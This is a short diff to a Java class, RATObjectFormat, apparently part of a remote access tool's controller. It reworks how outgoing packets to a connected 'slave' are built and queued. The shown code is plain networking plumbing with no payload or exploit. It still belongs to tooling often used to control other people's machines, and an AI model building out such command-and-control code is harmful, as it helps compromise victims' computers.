@@ -114,21 +114,21 @@ public class RATObjectFormat {
 		}, in, out, new Queue() {
 			@Override
 			public void addToSendQueue(final PacketBuilder arg0, final RATObject rat) throws Exception {
-				AbstractOutgoingPacket packet = new AbstractOutgoingPacket() {
-					@Override
-					public void write(Slave slave, DataOutputStream dos) throws Exception {
-						arg0.write(dos);
-					}
-					@Override
-					public byte getPacketId() {
-						return arg0.getHeader();
-					}
-				};
-				
 				Slave slave = getFromRATObject(rat);
-				
+
 				if (slave != null) {
-					packet.send(slave, slave.getDataOutputStream());
+					AbstractOutgoingPacket packet = new AbstractOutgoingPacket() {
+						@Override
+						public void write(Slave slave, DataOutputStream dos) throws Exception {
+							arg0.write(rat, slave.getDataOutputStream(), slave.getDataInputStream());
+						}
+						@Override
+						public byte getPacketId() {
+							return arg0.getHeader();
+						}
+					};
+					
+					slave.addToSendQueue(packet);
 				} else {
 					throw new NullPointerException("No connection found for IP " + rat.getIP());
 				}
